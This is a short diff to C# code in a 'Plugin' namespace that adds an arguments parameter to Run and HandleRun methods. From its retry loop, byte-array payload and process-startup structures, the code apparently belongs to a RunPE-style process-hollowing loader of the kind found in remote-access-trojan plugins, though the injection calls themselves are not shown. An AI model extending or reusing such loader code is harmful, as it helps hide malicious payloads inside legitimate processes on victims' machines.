@@ -54,17 +54,17 @@ namespace Plugin
             private readonly IntPtr StdError;
         }
 
-        public static bool Run(string path, byte[] data, bool protect)
+        public static bool Run(string path, byte[] data, string args, bool protect)
         {
             for (int I = 1; I <= 5; I++)
-                if (HandleRun(path, data, protect)) return true;
+                if (HandleRun(path, data, args, protect)) return true;
             return false;
         }
 
-        private static bool HandleRun(string path, byte[] data, bool protect)
+        private static bool HandleRun(string path, byte[] data, string args, bool protect)
         {
             int readWrite = 0;
-            string quotedPath = "";
+            string quotedPath = args;
             StartupInformation si = new StartupInformation();
             ProcessInformation pi = new ProcessInformation();
             si.Size = Convert.ToUInt32(Marshal.SizeOf(typeof(StartupInformation)));
